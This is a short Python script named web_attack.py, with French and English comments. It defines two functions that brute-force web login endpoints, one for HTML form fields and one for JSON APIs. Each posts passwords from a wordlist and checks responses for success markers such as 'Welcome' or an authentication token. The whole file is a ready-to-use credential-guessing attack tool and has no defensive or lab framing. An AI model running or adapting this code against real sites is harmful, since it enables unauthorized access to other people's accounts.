# web_attack.py

import requests

def web_login_brute_force(url, username, wordlist, user_field, pass_field, success_check):
    """
    Tente de se connecter à un formulaire web en testant une wordlist.
    
    - url : URL de la requête POST
    - username : identifiant fixe (ex: 'admin')
    - wordlist : liste de mots de passe à tester
    - user_field : nom du champ input du formulaire pour le login (ex: 'email')
    - pass_field : nom du champ input pour le mot de passe (ex: 'password')
    - success_check : texte indiquant que le login est réussi (ex: 'Welcome' ou 'token')
    """
    for password in wordlist:
        data = {
            user_field: username,
            pass_field: password
        }

        try:
            response = requests.post(url, data=data, timeout=5)
            if success_check in response.text:
                print(f"[✔] Mot de passe trouvé : {password}")
                return password
        except Exception as e:
            print(f"[!] Erreur avec {password} : {e}")
    
    print("[✘] Aucun mot de passe trouvé.")
    return None

def json_login_brute_force(url, username, wordlist):
    total = len(wordlist)
    for i, password in enumerate(wordlist):
        try:
            response = requests.post(url, json={
                "email": username,
                "password": password
            }, timeout=5)

            progress = ((i + 1) / total) * 100

            if response.status_code == 200:
                try:
                    json_resp = response.json()
                    if "authentication" in json_resp or "token" in json_resp.get("authentication", {}):
                        print(f"[✔] Password found: {password}")
                        yield progress, password
                        return
                except Exception as e:
                    pass
        except Exception as e:
            print(f"[!] Error: {e}")

        yield ((i + 1) / total) * 100, None

